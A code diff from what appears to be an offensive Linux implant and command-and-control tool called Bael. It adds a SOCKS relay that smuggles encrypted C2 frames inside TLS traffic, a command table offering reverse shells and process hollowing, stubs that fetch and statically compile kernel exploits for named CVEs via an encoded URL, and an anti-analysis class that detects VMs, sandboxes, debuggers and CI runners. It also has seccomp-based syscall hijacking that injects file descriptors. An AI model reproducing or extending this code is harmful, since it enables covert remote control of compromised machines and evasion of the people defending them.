@@ -5,6 +5,41 @@ from pathlib import Path
 from collections import deque
 from typing import Tuple, Optional, Deque, Any, Dict, List, Union
 
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+    from cryptography.exceptions import InvalidTag
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    class InvalidTag(Exception): pass
+
+__version__ = "0.2.5"
+__author__ = "J4ck3LSyN"
+
+# ====================== LOGGING ======================
+class BaelFormatter(logging.Formatter):
+    COLORS = {
+        logging.DEBUG: "\x1b[38;2;100;100;100m",
+        logging.INFO: "\x1b[38;2;0;150;255m",
+        logging.WARNING: "\x1b[33m",
+        logging.ERROR: "\x1b[31m",
+        logging.CRITICAL: "\x1b[41m\x1b[37m"
+    }
+    RESET = "\x1b[0m"
+
+    def format(self, record):
+        record.asctime = self.formatTime(record, self.datefmt)
+        color = self.COLORS.get(record.levelno, self.COLORS[logging.INFO])
+        return f"{self.COLORS[logging.DEBUG]}[{record.asctime}]{self.RESET} {color}{record.levelname:<8}{self.RESET} {record.getMessage()}"
+
+logger = logging.getLogger("bael")
+logger.setLevel(logging.INFO)
+handler = logging.StreamHandler()
+handler.setFormatter(BaelFormatter(datefmt="%H:%M:%S"))
+logger.addHandler(handler)
+
 # ==================== SECCOMP STRUCTURES ===================
 
 class SeccompData(ctypes.Structure):
@@ -40,40 +75,7 @@ class SeccompNotifAddfd(ctypes.Structure):
         ("newfd_flags", ctypes.c_uint32),
     ]
 
-try:
-    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
-    from cryptography.hazmat.primitives import hashes
-    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
-    from cryptography.exceptions import InvalidTag
-    CRYPTO_AVAILABLE = True
-except ImportError:
-    CRYPTO_AVAILABLE = False
-    class InvalidTag(Exception): pass
-
-__version__ = "0.2.4"
-__author__ = "J4ck3LSyN"
-
-# ====================== LOGGING ======================
-class BaelFormatter(logging.Formatter):
-    COLORS = {
-        logging.DEBUG: "\x1b[38;2;100;100;100m",
-        logging.INFO: "\x1b[38;2;0;150;255m",
-        logging.WARNING: "\x1b[33m",
-        logging.ERROR: "\x1b[31m",
-        logging.CRITICAL: "\x1b[41m\x1b[37m"
-    }
-    RESET = "\x1b[0m"
-
-    def format(self, record):
-        record.asctime = self.formatTime(record, self.datefmt)
-        color = self.COLORS.get(record.levelno, self.COLORS[logging.INFO])
-        return f"{self.COLORS[logging.DEBUG]}[{record.asctime}]{self.RESET} {color}{record.levelname:<8}{self.RESET} {record.getMessage()}"
-
-logger = logging.getLogger("bael")
-logger.setLevel(logging.INFO)
-handler = logging.StreamHandler()
-handler.setFormatter(BaelFormatter(datefmt="%H:%M:%S"))
-logger.addHandler(handler)
+# ========================== HEXDUMP ======================== 
 
 def bHexdump(data: bytes, length: int = 16, prefix: str = "") -> str:
     if not data: return "(empty)" if prefix else ""
@@ -84,6 +86,8 @@ def bHexdump(data: bytes, length: int = 16, prefix: str = "") -> str:
         aStr = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
         lines.append(f"{prefix}{i:04x}  {hStr:<{length*3}}  {aStr}")
     return '\n'.join(lines)
+
+# =============== SMUGGLE MAGIC/CERT OBJECT =================
 
 SMUGGLE_MAGIC = b"\xBA\x31\xDE\xAD\xC0\xDE"
 EMBEDDED_CERTS: Dict[str, str] = {}
@@ -114,6 +118,31 @@ class BaelShield:
             return cls.deobfuscate(EMBEDDED_CERTS[name], key)
         return None
 
+# ========================== BUFFERING ========================
+
+class BaelBuffer:
+    """Memory-safe buffer for pattern matching and frame extraction"""
+    def __init__(self, max_size: int = 10 * 1024 * 1024): # 10MB limit
+        self._data = bytearray()
+        self.max_size = max_size
+
+    def feed(self, chunk: bytes):
+        if len(self._data) + len(chunk) > self.max_size:
+            to_drop = (len(self._data) + len(chunk)) - self.max_size
+            del self._data[:to_drop]
+            logger.warning(f"[BUFFER] Capacity reached, dropped {to_drop} bytes")
+        self._data.extend(chunk)
+
+    def find(self, pattern: bytes) -> int: return self._data.find(pattern)
+    def __len__(self): return len(self._data)
+    def consume(self, length: int) -> bytes:
+        out = bytes(self._data[:length])
+        del self._data[:length]
+        return out
+
+    def peek(self, length: int) -> bytes: return bytes(self._data[:length])
+    def clear(self): self._data.clear()
+
 # ========================== SOCKS5 ==========================
 
 class SocksRelay:
@@ -136,11 +165,11 @@ class SocksRelay:
             nmethods = header[1]
             methods = await asyncio.wait_for(socks_r.read(nmethods), timeout=2.0)
             
-            # Check if we should use authentication
+            # === Method Selection ===
             if self.username and self.password:
                 if 0x02 not in methods:
                     logger.warning("[!] Client does not support User/Pass auth")
-                    socks_w.write(b"\x05\xFF")
+                    socks_w.write(b"\x05\xFF") # No acceptable methods
                     await socks_w.drain()
                     return
                 
@@ -153,37 +182,60 @@ class SocksRelay:
                     return
                 
                 ulen = auth_header[1]
-                uname = (await socks_r.read(ulen)).decode()
-                plen = (await socks_r.read(1))[0]
-                passwd = (await socks_r.read(plen)).decode()
+                uname = (await socks_r.read(ulen)).decode(errors='ignore')
+                plen_bytes = await socks_r.read(1)
+                if not plen_bytes: return
+                passwd = (await socks_r.read(plen_bytes[0])).decode(errors='ignore')
                 
                 if uname == self.username and passwd == self.password:
                     socks_w.write(b"\x01\x00") # Success
                     await socks_w.drain()
                 else:
+                    logger.warning(f"[!] SOCKS auth failed for user: {uname}")
                     socks_w.write(b"\x01\x01") # Failure
                     await socks_w.drain()
                     return
             else:
-                socks_w.write(b"\x05\x00") # No Auth
+                if 0x00 not in methods:
+                    socks_w.write(b"\x05\xFF") # No acceptable methods
+                    await socks_w.drain()
+                    return
+                socks_w.write(b"\x05\x00") # No Authentication Required
                 await socks_w.drain()
 
-            logger.debug("[SOCKS] Sent method selection")
-            # === SOCKS Request (minimal) ===
+            # === SOCKS Request ===
             req = await asyncio.wait_for(socks_r.read(4), timeout=5.0)
-            logger.debug(f"[SOCKS] Request: {req.hex() if req else None}")
-            # Skip the rest of the request
-            if len(req) >= 4 and req[3] == 0x01:await socks_r.read(4)   # IPv4
-            elif len(req) >= 4 and req[3] == 0x03:
-                alen = (await socks_r.read(1))[0];await socks_r.read(alen)
-            await socks_r.read(2)  # port
+            if len(req) < 4: return
+            ver, cmd, rsv, atyp = req
+            
+            if cmd != 0x01: # CONNECT only
+                logger.warning(f"[SOCKS] Unsupported command: {cmd}")
+                socks_w.write(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
+                await socks_w.drain()
+                return
+
+            if atyp == 0x01: # IPv4
+                await socks_r.read(4)
+            elif atyp == 0x03: # Domain
+                alen_bytes = await socks_r.read(1)
+                if alen_bytes: await socks_r.read(alen_bytes[0])
+            elif atyp == 0x04: # IPv6
+                await socks_r.read(16)
+            else:
+                logger.warning(f"[SOCKS] Unsupported address type: {atyp}")
+                socks_w.write(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
+                await socks_w.drain()
+                return
+            
+            await socks_r.read(2) # Port
             socks_w.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
             await socks_w.drain()
             logger.info("[-] [SOCKS] Handshake completed successfully")
             # === Launch both directions with heavy logging ===
             logger.info("[RELAY] Starting bidirectional tasks...")
             async with asyncio.TaskGroup() as tg:
-                tg.create_task(self._socks_to_tls(socks_r, tls_w, engine))
+                tg.create_task(self._socks_to_tls(socks_r, tls_w))
+                tg.create_task(self._smuggle_pump(tls_w, engine))
                 tg.create_task(self._tls_to_socks(tls_r, socks_w, engine))
 
         except asyncio.TimeoutError as e: logger.error(f"[SOCKS] Timeout during handshake: {e}")
@@ -198,74 +250,71 @@ class SocksRelay:
                     if not w.is_closing(): w.close()
                 except: pass
 
-    async def _socks_to_tls(self, reader, writer, engine):
-        logger.info("↗ [TASK] _socks_to_tls started")
+    async def _socks_to_tls(self, reader, writer):
+        logger.info("↗ [TASK] _socks_to_tls (forwarding) started")
         try:
             while True:
-                # 1. Flush smuggled C2 responses to the server first
-                while engine and engine.smuggleQueue:
+                data = await reader.read(16384)
+                if not data:
+                    logger.info("(_socks_to_tls) ↗ [TASK] SOCKS client closed connection")
+                    break
+                logger.debug(f"↗ SOCKS→TLS forwarded {len(data)} bytes")
+                writer.write(data)
+                await writer.drain()
+        except Exception as e: logger.error(f"↗ _socks_to_tls error: {e}")
+
+    async def _smuggle_pump(self, writer, engine):
+        """Standalone smuggling task woken by asyncio.Event"""
+        if not engine: return
+        logger.info("↗ [TASK] _smuggle_pump started")
+        try:
+            while True:
+                await engine.smuggle_event.wait()
+                engine.smuggle_event.clear()
+                while engine.smuggleQueue:
                     smuggled = engine.smuggleQueue.popleft()
-                    logger.info(f"↗ [SMUGGLE] Injecting queued C2 response ({len(smuggled)} bytes) into TLS stream")
+                    logger.info(f"(_smuggle_pump) ↗ [SMUGGLE] Injecting queued C2 data ({len(smuggled)} bytes)")
                     writer.write(smuggled)
                     await writer.drain()
-                # 2. Forward regular SOCKS traffic
-                try:
-                    # Use a short timeout so we can return to check the smuggleQueue
-                    data = await asyncio.wait_for(reader.read(16384), timeout=0.1)
-                    if not data:
-                        logger.info("↗ [TASK] SOCKS client closed connection")
-                        break
-                    logger.debug(f"↗ SOCKS→TLS forwarded {len(data)} bytes")
-                    writer.write(data)
-                    await writer.drain()
-                except asyncio.TimeoutError: continue
-        except Exception as e: logger.error(f"↗ _socks_to_tls error: {e}")
+        except Exception as e: logger.debug(f"↗ _smuggle_pump concluded/error: {e}")
 
     async def _tls_to_socks(self, reader, writer, engine):
         """This is the critical task for receiving whoami"""
-        logger.info("↘ [TASK] _tls_to_socks STARTED ← This must appear!")
-        buffer = bytearray()
+        logger.info("(_tls_to_socks) ↘ [TASK] _tls_to_socks STARTED ← This must appear!")
+        buf = BaelBuffer()
         try:
             while True:
-                logger.debug("↘ [TASK] Waiting for data from TLS...")
                 data = await reader.read(16384)
                 if not data:
-                    logger.warning("↘ [TASK] TLS server closed connection")
+                    logger.warning("(_tls_to_socks) ↘ [TASK] TLS server closed connection")
                     break
-                logger.info(f"↘ [TASK] RECEIVED {len(data)} bytes from TLS!")
-                buffer.extend(data)
-                if len(data) > 16:
-                    logger.debug(f"↘ First 64 bytes:\n{bHexdump(data[:64], prefix='  ')}")
+                buf.feed(data)
                 # === C2 Frame Extraction ===
-                while self.magic in buffer:
-                    magic_idx = buffer.find(self.magic)
-                    logger.info(f"[C2] SMUGGLE_MAGIC FOUND at offset {magic_idx}!")
+                while True:
+                    magic_idx = buf.find(self.magic)
+                    if magic_idx == -1:
+                        # Forward data but keep enough for a potential split magic pattern
+                        keep = len(self.magic) - 1
+                        if len(buf) > keep:
+                            writer.write(buf.consume(len(buf) - keep))
+                            await writer.drain()
+                        break
                     if magic_idx > 0:
-                        clean = bytes(buffer[:magic_idx])
-                        logger.debug(f"Forwarding {len(clean)} clean bytes to SOCKS client")
-                        writer.write(clean)
+                        writer.write(buf.consume(magic_idx))
                         await writer.drain()
-                    header_start = magic_idx + len(self.magic)
-                    if len(buffer) < header_start + 2:
-                        logger.warning("Incomplete header")
-                        break
-                    payload_len = int.from_bytes(buffer[header_start:header_start+2], "big")
-                    frame_end = header_start + 2 + payload_len
-                    if len(buffer) < frame_end:
-                        logger.debug("Incomplete frame")
-                        break
-                    frame = bytes(buffer[magic_idx:frame_end])
-                    logger.info(f"[C2] Processing frame ({len(frame)} bytes)")
+
+                    if len(buf) < len(self.magic) + 2: break
+                    
+                    header = buf.peek(len(self.magic) + 2)
+                    payload_len = int.from_bytes(header[len(self.magic):], "big")
+                    frame_end = len(self.magic) + 2 + payload_len
+                    
+                    if len(buf) < frame_end: break
+                    
+                    frame = buf.consume(frame_end)
                     if engine: await engine.c2.pCommand(frame)
-                    else: logger.error("No engine!")
-                    buffer = buffer[frame_end:]
-                # Forward normal data
-                if buffer:
-                    writer.write(bytes(buffer))
-                    await writer.drain()
-                    buffer.clear()
         except Exception as e:
-            logger.error(f"↘ _tls_to_socks CRASHED: {type(e).__name__}: {e}")
+            logger.error(f"(_tls_to_socks) ↘ CRASHED: {type(e).__name__}: {e}")
             import traceback
             logger.error(traceback.format_exc())
 
@@ -359,7 +408,7 @@ class HiveMindConsole:
             # Use 'crypt' to match Bael.__init__ attribute name
             encrypted = self.engine.crypt.encrypt(command.encode())
             packet = SMUGGLE_MAGIC + len(encrypted).to_bytes(2, "big") + encrypted
-            self.engine.smuggleQueue.append(packet)
+            self.engine.enqueue_smuggle(packet)
             logger.info(f"Command sent: {command}")
         except Exception as e:
             logger.error(f"Failed to send command: {e}")
@@ -393,6 +442,294 @@ class C2:
         if self.args.c2_uringenum:
             self.logger.info(f"(C2.__init__) Initializing uRing Enum {json.dumps(self.ioURingEnumProc(), indent=2)}")
             sys.exit(0)
+
+    # - fragnesia (CVE-2026-46300:V12 Security)
+    class Fragnesia:
+        """
+        og repo: https://github.com/v12-security/pocs.git
+        """
+        def __init__(self,args):
+            self.args = args
+            self.logger = logger
+            self.fURL = """XmoUNb2=|Ca$$EaXK8e3bz*gMWpZP0ZggdCbS`6WZ7)hRV{0=^Q+ZA;M`dm@FK};Tb1!mbW^*rSWnpA<FKuCIZZBqXVP|e-b7^5MHDqEqIb%6FH8wV8V=r@SVqbG*XKiI}bYEq7aBOdBbS`5"""
+            self.verified = False
+
+    
+    # - dirtyfrag (CVE-2026-43284:V4bel)
+    class DirtyFrag:
+        """
+        og repo: https://github.com/v12-security/pocs.git
+        """
+        def __init__(self,args):
+            self.args = args
+            self.logger = logger
+            self.fURL = "XmoUNb2=|Ca$$EaXK8e3bz*gMWpZP0ZggdCbS`6WZ7)hRV{0=^Q+ZA;M`dm@FJx(Qba`fSVP`LLWoC0PXk}q!b1!XSb97~LFJ*XeE@J"
+            self.verified = False
+            self.dropName = "df.c"
+            self.buildName = "df"
+            self.GCC_BUILD = [
+                "gcc -static -O2 -s -o %s %s -pthread",
+                "strip %s"]
+
+        def _buildGCCCommand(self):
+            gccstr0 = self.GCC_BUILD[0] % (self.buildName, self.dropName)
+            gccstr1 = self.GCC_BUILD[1] % self.buildName
+            self.GCC_BUILD = [gccstr0, gccstr1]
+            self.logger.debug("(_buildGCCCommand) Included dropname('%s') and buildname('%s')",self.dropName,self.buildName)
+            return
+        
+        def _decodeURL(self):
+            rout = base64.b85decode(str(self.fURL).encode("ascii"))
+            self.logger.debug("(_decodeURL) Decoded url (base85): %s",rout)
+            return rout.decode("ascii")
+        
+        
+            
+
+    # - anti-aliasing
+    class AntiAlias:
+        """
+        Advanced anti-analysis / anti-sandbox class for Linux implants.
+        """
+
+        def __init__(self, logger: Optional[logging.Logger] = None):
+            self.logger = logger or logging.getLogger(__name__)
+            self.libc = None
+            self._setupLibC()
+            # Common VM MAC prefixes (first 6-8 characters)
+            self.VMMACPREFIX = {
+                "00:50:56", "00:0C:29", "00:05:69", "00:1C:14",  # VMware
+                "08:00:27", "0A:00:27",                          # VirtualBox
+                "52:54:00",                                      # QEMU/KVM (very common)
+                "00:16:3E",                                      # Xen
+                "00:15:5D",                                      # Hyper-V
+                "00:21:F6",                                      # Oracle
+            }
+            # Suspicious UUID patterns often seen in VMs
+            self.VMUUIDPATTERNS = {"00000000-0000", "12345678-1234", "VMWARE", "VBOX"}
+            self.logger.debug("()")
+
+        def _setupLibC(self):
+            try:
+                self.libc = ctypes.CDLL("libc.so.6", use_errno=True)
+                self.libc.ptrace.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p]
+                self.libc.ptrace.restype = ctypes.c_long
+            except Exception as e:
+                self.logger.error(f"Failed to load libc: {e}")
+                self.libc = None
+
+        def _rFile(self, path:str, default:str = "") -> str:
+            try:
+                with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                    rout =  f.read()
+                    self.logger.debug(f"(_rFile) Read {str(len(rout))}/bytes from `{str(path)}`")
+                    return rout
+            except Exception as E:
+                self.logger.debug(f"(_rFile) Caught Exception(non-critcal:return default): {E}")
+                return default
+
+        def _resolveAllMacAddr(self) -> List[str]:
+            """Return all MAC addresses from /sys/class/net"""
+            macs = []
+            try:
+                for iface in os.listdir("/sys/class/net"):
+                    self.logger.debug("(_resolveAllMacAddr) Checking interface(lsdir:/sys/class/net): `%s`",iface)
+                    addrPath = f"/sys/class/net/{iface}/address"
+                    self.logger.debug("(resolveAllMacAddr) addrPath: %s",addrPath)
+                    if os.path.exists(addrPath):
+                        mac = self._rFile(addrPath).strip().lower()
+                        if mac and mac != "00:00:00:00:00:00": macs.append(mac)
+                        self.logger.debug("(_resolveAllMacAddr) Found MAC: %s",mac)
+            except Exception as E:
+                self.logger.debug("(_resolveAllMacAddr) Caught Exception(non-critcal:pass): {E}")
+                pass
+            self.logger.debug("(_resolveAllMacAddr) Returning: %s",macs)
+            return macs
+
+        def detectMacAddr(self) -> bool:
+            """Detect VM via common virtual MAC address prefixes."""
+            for mac in self._resolveAllMacAddr():
+                for prefix in self.VMMACPREFIX:
+                    if mac.startswith(prefix.lower()):
+                        self.logger.warning(f"(detectMacAddr)[!] VM MAC address detected: {mac} ({prefix})")
+                        return True
+            return False
+
+        def detectHardwareUUID(self) -> bool:
+            """Detect VM via DMI product UUID patterns. 
+            NOTE: Easily flagged operation (agressive)
+            """
+            uuid = self._rFile("/sys/class/dmi/id/product_uuid").strip().upper()
+            if not uuid or uuid == "00000000-0000-0000-0000-000000000000": return False
+            for pattern in self.VMUUIDPATTERNS:
+                if pattern in uuid:
+                    self.logger.warning(f"(detectHardwareUUID) Suspicious hardware UUID detected: {uuid}")
+                    return True
+            return False
+
+        def detectCPUCores(self) -> bool:
+            """Detect potential VM via unusually low CPU core count."""
+            cores = os.cpu_count() or 1
+            # Many sandboxes/VMs default to 1-4 cores
+            if cores <= 4:
+                self.logger.warning(f"(detectCPUCores) Low CPU core count detected: {cores} cores (possible VM/sandbox)")
+                return True
+            return False
+
+        def detectVMDrivers(self) -> bool:
+            """Fingerprint VM-specific kernel modules via /proc/modules."""
+            modContent = self._rFile("/proc/modules").lower()
+            vm_modules = {
+                "vbox", "vmware", "virtio", "kvm", "xen", "hyperv", "vboxguest",
+                "vmw", "qemu", "virtualbox", "openvz", "lxc"
+            }
+            for mod in vm_modules:
+                if mod in modContent:
+                    self.logger.warning(f"(detectVMDrivers) VM kernel module detected: {mod}")
+                    return True
+            return False
+
+        # === Existing methods (kept and cleaned) ===
+        def detectDbgr(self) -> bool:
+            if not self.libc:
+                return False
+            try:
+                if self.libc.ptrace(0, 0, 0, 0) < 0:   # PTRACE_TRACEME
+                    self.logger.warning("(detectDbgr) Debugger detected via PTRACE_TRACEME")
+                    return True
+            except Exception as E:
+                self.logger.debug(f"(detectDbgr) Caught Exception(non-critcal:pass): {E}")
+                pass
+
+            status = self._rFile("/proc/self/status")
+            for line in status.splitlines():
+                if line.startswith("TracerPid:"):
+                    try:
+                        pid = int(line.split()[1])
+                        if pid != 0:
+                            self.logger.warning(f"(detectDbgr) Debugger detected: TracerPid={pid}")
+                            return True
+                    except Exception as E: 
+                        self.logger.debug(f"(detectDbgr) Caught Exception(non-critcal:pass): {E}")
+                        pass
+            return False
+
+        def detectVM(self) -> bool:
+            """Comprehensive VM detection."""
+            if self.detectMacAddr(): return True
+            if self.detectHardwareUUID(): return True
+            if self.detectVMDrivers(): return True
+            # Existing artifact checks (kept for breadth)
+            artifacts = [
+                "/sys/class/dmi/id/product_name",
+                "/sys/class/dmi/id/sys_vendor",
+                "/proc/scsi/scsi",
+                "/proc/cpuinfo",
+            ]
+            VMKeywords = {"vbox", "virtualbox", "vmware", "qemu", "kvm", "xen", "hyper-v"}
+            for path in artifacts:
+                content = self._rFile(path).lower()
+                if any(kw in content for kw in VMKeywords):
+                    self.logger.warning(f"(detectVM) VM artifact in {path}")
+                    return True
+            return False
+
+        def detectSandbox(self) -> bool:
+            # (unchanged from previous version - kept for brevity)
+            cgroup = self._rFile("/proc/self/cgroup").lower()
+            if any(x in cgroup for x in ["docker", "lxc", "kubepod", "sandbox", "container"]):
+                self.logger.warning("(detectSandbox) [!] Container/sandbox via cgroup")
+                return True
+            status = self._rFile("/proc/self/status")
+            for line in status.splitlines():
+                if line.startswith("Seccomp:"):
+                    try:
+                        if int(line.split()[1]) > 0:
+                            self.logger.warning("(detectSandbox) [!] Seccomp sandbox detected")
+                            return True
+                    except Exception as E:
+                        self.logger.debug(f"(detectSandbox) Caught Exception(non-critcal:pass): {E}")
+                        pass
+            try:
+                if os.readlink("/proc/self/ns/user") != os.readlink("/proc/1/ns/user"):
+                    self.logger.warning("(detectSandbox) [!] Non-init user namespace (possible sandbox)")
+                    return True
+            except Exception:
+                pass
+            return False
+
+        def detectCI(self) -> bool:
+            """Detect if running in a common CI/CD environment (e.g., GitHub Actions, GitLab CI)."""
+            ci_indicators = {
+                "GITHUB_ACTIONS": "GitHub Actions",
+                "GITLAB_CI": "GitLab CI",
+                "CI": "Generic CI Provider",
+                "TRAVIS": "Travis CI",
+                "CIRCLECI": "CircleCI",
+                "JENKINS_URL": "Jenkins",
+                "TEAMCITY_VERSION": "TeamCity"
+            }
+            for var, name in ci_indicators.items():
+                if os.environ.get(var):
+                    self.logger.warning(f"(detectCI) [!] CI environment detected: {name} (via {var})")
+                    return True
+            return False
+
+        def detectLDPreload(self) -> bool:
+            if os.environ.get("LD_PRELOAD"):
+                self.logger.warning("(detectLDPreload) LD_PRELOAD detected!")
+                return True
+            return False
+
+        def detectTimingAnomaly(self, iterations: int = 100000) -> bool:
+            """
+            NOTE: Detect timing anomalies functionality needs to be tested.
+            """
+            def timing_test() -> float:
+                start = time.perf_counter()
+                x = 0
+                for _ in range(iterations): x += 1
+                return time.perf_counter() - start
+
+            times = [timing_test() for _ in range(5)]
+            avg = sum(times) / len(times)
+            if avg > 0.008:   # Tune this threshold after testing
+                self.logger.warning(f"(detectTimingAnomaly) Timing anomaly detected (avg={avg:.5f}s) — possible VM")
+                return True
+            return False
+
+        def getPTraceScope(self) -> int:
+            """
+            NOTE: Easily flagged operation (agressive)
+            """
+            try:
+                val = self._rFile("/proc/sys/kernel/yama/ptrace_scope", "1").strip()
+                return int(val)
+            except Exception as E: 
+                self.logger.debug(f"(getPTraceScope) Caught Exception(return 1): {E}")
+                return 1
+
+        def detectALL(self, aggressive: bool = True) -> Dict[str, bool]:
+            """Run full suite of checks.
+            NOTE: Doing this can (most likely will) cause flags to be raised..."""
+            results = {
+                "debugger": self.detectDbgr(),
+                "vm": self.detectVM(),
+                "sandbox": self.detectSandbox(),
+                "ci": self.detectCI(),
+                "ld_preload": self.detectLDPreload(),
+                "low_cores": self.detectCPUCores(),
+                "ptrace_scope": self.getPTraceScope(),
+            }
+            if aggressive: results["timing_anomaly"] = self.detectTimingAnomaly()
+            results["compromised"] = any([
+                results["debugger"], results["vm"], results["sandbox"], results["ci"],
+                results["ld_preload"], results.get("low_cores", False)
+            ])
+            if results["compromised"]: self.logger.warning("[ANTI-ALIAS] [=!=]  Environment appears analyzed/monitored! [=!=]")
+            else: self.logger.info("[ANTI-ALIAS] Environment appears clean.")
+            return results
+            
 
     # - copy-fail
     class copyFail:
@@ -584,6 +921,7 @@ class C2:
             """"""
             self.SECCOMP_SET_MODE_FILTER = 1
             self.SECCOMP_FILTER_FLAG_NEW_LISTENER = 1 << 0
+            self.SECCOMP_FILTER_FLAG_TSYNC = 1 << 4
             self.SECCOMP_IOCTL_NOTIF_RECV = 0xC0102100 | (ctypes.sizeof(ctypes.c_uint64) * 2)
             self.SECCOMP_IOCTL_NOTIF_SEND = 0xC0182101
             self.SECCOMP_IOCTL_NOTIF_ID_VALID = 0xC0082102
@@ -595,6 +933,14 @@ class C2:
             self.SeccompNotif = SeccompNotif
             self.SeccompNotifResp = SeccompNotifResp
             self.SeccompNotifAddfd = SeccompNotifAddfd
+
+            # Syscall Numbers (x86_64)
+            self.SYS_execve = 59
+            self.SYS_ptrace = 101
+            self.SYS_socket = 41
+            self.SYS_openat = 257
+            self.SYS_openat2 = 437
+            self.EPERM = 1
 
     
     # - shellcode operations 
@@ -644,6 +990,7 @@ class C2:
                 "sysinfo": lambda: self._get_sysinfo(),
                 "whoami": lambda: self._get_whoami(),
                 "hardware": lambda: self._get_hardware_info(),
+                "check": lambda: json.dumps(self.AntiAlias(self.logger).detectALL()).encode(),
                 "download": lambda a: self._download(a),
                 "shell": lambda a: self._spawnRevShell(a),
                 "hollow": lambda a: self._pHollow(a),
@@ -662,7 +1009,7 @@ class C2:
                         result = result.encode()
                     encResp = self.crypt.encrypt(result)
                     resp = SMUGGLE_MAGIC + len(encResp).to_bytes(2, "big") + encResp
-                    self.engine.smuggleQueue.append(resp)
+                    self.engine.enqueue_smuggle(resp)
                     logger.info(f"[C2] Command '{cmd}' executed, response queued")
                 return True
 
@@ -823,6 +1170,39 @@ class C2:
             self.logger.debug("(_pollFD) fd: %s, ready: %s, is_ready: %s",fd,ready,is_ready)
             return is_ready
         except: return False
+
+    def _readProcMemString(self, pid: int, addr: int) -> str:
+        """Reads a null-terminated string from a target process's memory"""
+        if not addr: return ""
+        try:
+            with open(f"/proc/{pid}/mem", "rb") as f:
+                f.seek(addr)
+                res = b""
+                for _ in range(32): # Limit to 4096 bytes (32 * 128)
+                    chunk = f.read(128)
+                    if not chunk: break
+                    if b"\x00" in chunk:
+                        res += chunk.split(b"\x00")[0]
+                        break
+                    res += chunk
+                return res.decode(errors='replace')
+        except Exception: return "[error_reading_mem]"
+
+    def _readProcMemArgv(self, pid: int, addr: int) -> List[str]:
+        """Reads a NULL-terminated array of string pointers (argv) from target memory"""
+        if not addr: return []
+        pointers = []
+        try:
+            with open(f"/proc/{pid}/mem", "rb") as f:
+                f.seek(addr)
+                while True:
+                    p_bytes = f.read(8)
+                    if len(p_bytes) < 8: break
+                    p = struct.unpack("<Q", p_bytes)[0]
+                    if p == 0: break
+                    pointers.append(p)
+            return [self._readProcMemString(pid, ptr) for ptr in pointers]
+        except Exception: return []
     
     def supervisor0(self, notifyFD: int, loaderFD: int):
         """Raw ctypes implementation of supervisor loop for seccomp notification handling"""
@@ -832,6 +1212,7 @@ class C2:
         req = self.seccomp.SeccompNotif()
         resp = self.seccomp.SeccompNotifResp()
         addfd = self.seccomp.SeccompNotifAddfd()
+
 
         alrInj = False
         while True:
@@ -850,8 +1231,9 @@ class C2:
             if libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_ID_VALID, ctypes.byref(ctypes.c_uint64(req.id))) < 0:
                 continue
 
-            # Syscall Hijacking Logic: Intercept openat (257) or openat2 (437)
-            hijack = (req.data.nr in (257, 437)) and not alrInj
+            # Syscall Hijacking Logic
+            hijack = (req.data.nr in (self.seccomp.SYS_openat, self.seccomp.SYS_openat2)) and not alrInj
+            block = req.data.nr in (self.seccomp.SYS_execve, self.seccomp.SYS_ptrace, self.seccomp.SYS_socket)
 
             if hijack:
                 self.logger.info(f"[HIJACK] Intercepted target syscall {req.data.nr} from PID {req.pid}")
@@ -868,6 +1250,23 @@ class C2:
                     continue  # Response already handled by ADDFD_FLAG_SEND
                 else:
                     self.logger.error(f"[HIJACK] ADDFD failed: errno {ctypes.get_errno()}")
+
+            elif block:
+                if req.data.nr == self.seccomp.SYS_execve:
+                    exe_path = self._readProcMemString(req.pid, req.data.args[0])
+                    argv = self._readProcMemArgv(req.pid, req.data.args[1])
+                    self.logger.warning(f"[BLOCK] Denying execve({exe_path}, {argv}) for PID {req.pid}")
+                else:
+                    self.logger.warning(f"[BLOCK] Denying syscall {req.data.nr} for PID {req.pid}")
+
+                resp.id = req.id
+                resp.flags = 0
+                resp.error = -self.seccomp.EPERM
+                resp.val = -1
+                try:
+                    libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_SEND, ctypes.byref(resp))
+                except Exception: pass
+                continue
 
             # Default response: Continue the syscall normally (SECCOMP_USER_NOTIF_FLAG_CONTINUE)
             resp.id = req.id
@@ -988,8 +1387,9 @@ class Bael:
         self.server = config.get("mode") == "s"
         self.tmpDir = None
         self.tunFd = -1
-        self.smuggleQueue: Deque[bytes] = deque()
+        self.smuggleQueue: Deque[bytes] = deque(maxlen=2048)
         self.shieldKey = config.get("key", "tWQLh/dj.HI/B2P#4/m#L6h/tV")
+        self.smuggle_event = asyncio.Event()
         self.crypt = Crypto(self.shieldKey)
         self.c2 = C2(self.crypt, self, args)
         self.SSLCTX = self._setupPKI()
@@ -997,6 +1397,12 @@ class Bael:
         self._loadSmuggleData()
         self.console = HiveMindConsole(self)
         logger.debug(f"PKI Status - Server: {self.server} | Key: {self.shieldKey[:8]}...")
+
+    def enqueue_smuggle(self, data: bytes):
+        """Helper to safely enqueue smuggled data and wake up the pump."""
+        if not data: return
+        self.smuggleQueue.append(data)
+        self.smuggle_event.set()
 
     @staticmethod
     def build(name="bMTLSTUN0", buildPath=".baelBuild", verbose=False, bundleKeys=True):
@@ -1022,7 +1428,7 @@ class Bael:
             try:
                 raw = Path(path).read_bytes()
                 for i in range(0, len(raw), 180): 
-                    self.smuggleQueue.append(raw[i:i+180])
+                    self.enqueue_smuggle(raw[i:i+180])
             except Exception as e: logger.error(f"Smuggle Load Failed: {e}")
 
     def _setupPKI(self):
@@ -1127,46 +1533,46 @@ class Bael:
 
     async def _serverToClient(self, w):
         while True:
-            if self.smuggleQueue:
-                try:
+            await self.smuggle_event.wait()
+            self.smuggle_event.clear()
+            try:
+                while self.smuggleQueue:
                     data = self.smuggleQueue.popleft()
-                    w.write(data); await w.drain()
-                except: break
-            await asyncio.sleep(0.05)
+                    w.write(data)
+                    await w.drain()
+            except Exception: break
 
